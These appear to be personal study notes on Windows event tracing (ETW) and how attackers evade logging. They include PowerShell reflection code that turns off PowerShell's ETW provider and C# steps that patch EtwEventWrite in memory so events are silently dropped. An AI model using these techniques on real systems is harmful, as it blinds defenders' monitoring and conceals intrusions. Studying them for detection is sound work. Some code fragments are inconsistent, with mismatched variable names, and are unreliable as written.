-SIEM (Security Information and Event Manager)
-primary target for an attacker is event logs managed by ETW
-ETW (Envent Tracing for Windows)

--------------------------------------------------------------------------

Event tracing
-ETW handle logging at application and kernel levels
-event Ids are core feature of windows logging
-events are sent and transferred in XML (Extensible Markup Language)
-events that could be generated when carrying out operation can disrupt goals of attacker

componenets
-Controllers: build and configure sessions
-Providers: generate events
-Consumer: interpret events

--------------------------------------------------------------------------------------------------------------------------------------------------

Approaches to log evasion
-typical log forwarding is employed 
-log forwarding: move logs from the host machine to a central server or indexer so they won't be modified later
1102: logs when the windows security audit log was cleared
104: logs when the log file was cleared
1100: logs when the windows event log service was shut down
-process of deleting logs risks operational security

----------------------------------------------------------------------------------------------------------------------

Tracing instrumentation
-controller define size and location of the log file, start and stop event tracing sessions, enable providers, manage size of buffer pool, obtain execution stats
-providers contain event tracing instrumentation
four types of providers
1. MOF (managed object format): defines events from MOF classes. Enabled by one trace session at a time
2. WPP (windows software trace preprocessor): associated with TMF (trace message format) files to decode info. enabled by one trace session at a time.
3. Manifest-Based: Defines events from a manifest. enabled by up to eight trace sessions at a time
4. TraceLogging: self-describing events containing all required information. enabled by up to eight trace sessions at a time
-consumers are applications that select one or more event tracig sessions as a source of events. can get stored or real time events

techniques to target each ETW component
Provider -> PSEtwLogProvider Modification, Group Policy Takeover, Log Pipeline Abuse, Type Creation
Controller -> Patching EtwEventWrite, Runtime Tracing Tampering, 
Consumers -> Log Smashing, Log Tampering

-----------------------------------------------------------------------------------------------------------------------------------------------------------------

Inside .NET assembly - information about assembly contents - metadata
.NET assembly: PSEtwLogProvider

-obtain .NET assembly for PSEtwLogProvider
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')

-store a null value for etwProvider
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)

-set field for m_enabled to previously stored value
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);

-compile into one ps file
-run other code

-----------------------------------------------------------------------------------------------------------------------------

Patching Tracing Function
-ETW loaded from runtime of every new process - CLR (common language runtime)
-can write pre-defined opcodes to an in-memory function to disable functionalities
-LIFO - last in first out structure
-ETW is written from the function EtwEventWrite

-assembly ret 14h will end the function and return to previous application
-steps: 
1. obtain handle for EtwEventWrite
var ntdll = Win32.LoadLibrary("ntdll.dll");
var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");

2. Modify Memory permissions of the function - flNewProtect - 0x40 enables X,R,RW
uint oldProtect;
Win32.VirtualProtect(
	etwFunction, 
	(UIntPtr)patch.Length, 
	0x40, 
	out oldProtect
);

3. Write opcode bytes to memory - Marshal.Copy to write opcode
patch(new byte[] { 0xc2, 0x14, 0x00 });
Marshal.Copy(
	patch, 
	0, 
	etwEventSend, 
	patch.Length
);

4. Reset memory permissions of the function
VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect);

5. Flush the instruction cache
Win32.FlushInstructionCache(
	etwFunction,
	NULL
);
